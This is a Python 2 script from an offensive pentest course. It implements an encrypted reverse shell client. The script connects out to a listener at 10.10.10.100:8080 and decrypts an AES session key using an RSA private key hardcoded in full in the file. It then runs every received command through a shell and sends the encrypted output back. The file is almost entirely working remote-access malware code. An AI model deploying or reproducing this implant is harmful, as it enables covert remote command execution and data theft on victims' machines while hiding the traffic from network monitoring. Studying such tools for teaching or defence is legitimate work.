# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

import socket                    
import subprocess                 

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES


def GET_AES_KEY(KEY):
    privatekey = """-----BEGIN RSA PRIVATE KEY-----
MIIJJwIBAAKCAgEAuc6x96OOn4YCIjJD8onzzMSMWcJhfxmE6r886pyQShEc6vVP
jl+LozyHD4BWKZ7sm/vvAn+Rf9rck6mJxB5Yt01nLOoGxLMlVWjwlLBzH5XZIFJG
FurBDM801W+87NDyIwldb8B8njCd63UDzoXKjSdN1+9u4Weo6zw43nHu+VnFKhRX
P4h0AbwCHjymAzHz8n/7dAeCjsjdlfR+Xr3cL0sdS/8vtuYFZ1PkrRJi1KqRl6hz
CTlnAFRuMkjpjuSopvqw6MJwHfez2NdkHyXhrUejxcgAWUBC8Z05xveXb+CzYwh2
Up0zYw8NXD9jJ6CHsmL4KvPPt65UoQwudKaEQTua2U6eJQuUldzv5lmCutPla880
FdFeBHsLvv8yy/7LKApqCtK5EmRVGoRPcvYMzHvIpeCHmdSlvv0rbMKGiOxGYVJN
F4evvqHdJO2jEny0+J7iqbEHMTRfNMnPglSIf7ADjHK40SDxSlEJYo1Hmu0qLaQa
E6gjFUknnzjYrjOiIC79JPOXJ5yMk6aFlPhyjwpETqo1Mnoqjq+uMy9c1YBjdwAx
7+dwQgtMPP/QXiSqrrnfDVBKD3Iv4ZptgI42+Nhx5BGLuTnZqCQeuifcUXdRlAxr
v7W99zeLhMIDox1oYbV36iJovjsTZ35mmZfYz9OnvjvO2GHTx0vqF8DQPQ0CAwEA
AQKCAgAyNHNJ4lurJt50tvg9FKFXdtQlfKwzV4XemAWxrtQd7znNErOIWLC2Tqh/
u8GMRXDRROVz21xJG632CB09bKW0AaobLLDffThdN5mp03OH2Ultvk1J6+x1tZcl
BKgbpOmIJgOlKnGBnMlO0bNRnjz4nuIdsohXR1cRGJiVIlvb7DGmCRD6Dbiqr04z
NVf2DQ1JPOOImm7gfc3BsupiVxKjhLxJyI3v8X8MSFLFoO4rYFsui0lp+KSoJigQ
VjslbQtU8u/SNJduwXtK4Aghkm7ED1NlIYFWnFJ6Tm1KIaQ9io1t+N9fuzIjVfHa
NxZnoqyHus4rbO13SBd93HjA9C1PrMs6fggTzggTwpBQG4JqDYCrSY88kHrkq2Dy
9J5u3chEJG8FA0SLnlr9YVR/KJ4uA9o0Z7WvAPP0xhia2Mb6yaYVfB5HeQBi/XFV
q/wWqZztw/mE+BzdUVBJVxJoC4CHP18CW0py52rGI3nFfBHELRj1ZjpfOAm2BLUb
/lzVBEgihNY9dXBQ9aqqS1Yi8GbKh4k4HJ7narT37NG+Cwt0VoXHSDvY8DFm6/D9
xNwoMbBDz8teCBzO1XdI2/QG199YKxLNuXkDNJJROjRD/etOCJ8z7nn+ZKxrrtY0
p3NPpQFTtIMUUWIBL0W2TBCswfsITBdpTK4txXcVbScaw+5/UQKCAQEAytIooqij
bkF8JZOdwfIJRvYXWod730lDgse7Gfl1z/SqUMqY4pGuCC0TKr3DzggP9R58GM+y
HQ37KhVcxt+Ss+qxhSK6adOtJiipcssUMf+pR99XrhXqxHPEm/7Lwe9i6O+dA+Fz
VzE1TAtMsFZCOVWFkcYGpxdc1oqo/NUFZI0ziZqWVDH7/CRLeVuqPI7kkkyFR7sb
vnvjWkvYxTDm5N7RWAi1J3H5Fu+7QXenBF7qFLbpbkAv38BHvyyUnhlWMmYMCYs2
VSHkmploueMDjB9Gmgl4p0KkxbvG5aGyQ81Zi2Qdaem+Msgk3xQng/PYl+yfSo5o
VFXlue0vt+au9wKCAQEA6oaL4CO9yC0VDUpRjswAXrEYvwDTFTCcGeXIBZZFpC5r
CW+ouZm7Z8y5R2Jf6tF2sxKYUVD94nUo0ZAQT1v3bOkHQwUv2TiXcR4z7cc+OU7o
R3fFLeGkJKnhwqpi/C6OLYO/Z0EZpBSpFPQ9reHnNF0XkuGIUG3D65mKOKX9GsK2
N4C1qRWfqBqQJF4o3HqNSknKV1Sdyyyi3W1Mhl6Y7+o5FikYzhG6RqaAJ8uLYd14
baefSxGx+LODmqXnqQPJPfj7EgY582JFARXakEaBCfFMCOEx+A/f154TXO60apBS
2ahYXbtkZsyYs3XwgcTH8YsL6n5Vvx+ycBf4eLs/GwKCAQA/kPZjZG80UxnRvR4o
du8pal+PY/8S0Cd0iZy+W0ztTEVE5PpdqELfFSF4t9jybdxyeodyT0YHjSY23lMh
kVitQtU4YNYD7O/Lkdrpu3Qs52/qsrkMOppFz/LC4WyC78AUOWUAnlxD64xEtRXn
/mDrDz65nVLgc5YJN5QXCbyS8x4/9k8/PBs5vzZYZr5IFJDWuVzcSmw7myB6YGMk
CluTR7Jc4P3FyxbCdYg+0H1sBUNgEqO+hid6/Qx/gj1h/5bgXNNQ+myg6ep3+bS0
7c1i0TqTdHx4D48M2flQZwkz7twtr8b4NuYBjHDh6bMoy/gKRYL3HwLby8AgMZJP
FOGpAoIBAGNhDka1focjq2cNVhAXnBSEIQNXGxtAlPVYbHEJo4sV7F98RFgZr9Ml
amG4awK7Lfxl5cuXcW4TzW84B+FJDEjHWj9pJER8+ZeCf+jDZDeumzklpJVzpzWu
Ey+FOhq4s6DP0jyz1mS0KI3rjXNwZaPHyuR/016ZlMryLiMhG2bKmaJdVR1IP3Zh
gzEWAWSkPdj7+dUV0yO0T3NbDHFoBpCrhPNCCPPRiUjE50t1siOPUKfOvu51mh/U
GfFfWhJBu3YaWnHh146t1qXGF+7JIYcQC/M7UgxW1bitkHDx6du6OpFnB8L4VGxH
SHHLiVXECCHvlOYSEM3DZb6gObcXSX8CggEAMn/wlldMbETjkDt0GXJ2Jy4w/0v1
S/kWCMuYDQr3cspSikP8UU+IKQ1r3F/gVNUKdpijp343/64FN/5PboumN9ttIiP6
ggehNzC+AAh7Ag0vbJddcZGObRl0cRRLkUrTg7zEKBT53f/mpEgBe2hzNsUZkXRf
Y6pn+kOBJ3Bpa0yJbu9JCr6eEm2BfnHRBe6UV9y6wNdk1FFqLdWgwcbI7EdBv/If
rdQFceOY3QbbUFwey2MHuDPoTEqpTcpyP7NGblayCPFV2B3z9x9wMcUEhmClopy1
+tsc6e++GIFOuIpn+q+Nx3tIG5Fw8rHs4fZT99t9b65EOZibz2+Hg7+ceA==
-----END RSA PRIVATE KEY-----"""
    
    decryptor = RSA.importKey(privatekey)
    AES_Key = decryptor.decrypt(KEY)   
    return AES_Key



def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message) 



def connect():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    s.connect(('10.10.10.100', 8080))

    global key, counter

    x = s.recv(1024)


    key = GET_AES_KEY( x )
    print "Generated AES Key " + str(key)


    y = s.recv(1024)
    counter = GET_AES_KEY( y )

 
    while True:                                                 
        command =  decrypt(s.recv(1024))
        print ' We received: ' +  command
        
        if 'terminate' in command:                 
            s.close()
            break 
        
        else:                                                 
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( encrypt (CMD.stdout.read() ) ) 
            s.send( encrypt (CMD.stderr.read())  ) 

def main ():
    connect()
main()











